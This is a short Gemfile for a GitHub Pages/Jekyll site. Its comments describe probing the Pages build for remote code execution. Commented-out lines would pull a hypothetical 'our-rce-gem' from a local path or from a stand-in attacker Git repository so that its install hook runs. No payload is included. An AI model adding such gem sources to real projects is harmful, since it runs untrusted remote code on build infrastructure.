source "https://rubygems.org"

# Attempt to use a gem with malicious post_install hook
# Note: This shouldn't run in the Pages build environment
gem "github-pages", group: :jekyll_plugins

# Test: Can we include a custom gem that executes code?
# gem "our-rce-gem", path: "/tmp/our-gem"  # Path gems don't work remotely
# gem "our-rce-gem", git: "https://github.com/attacker/rce-gem"  # Git gems?
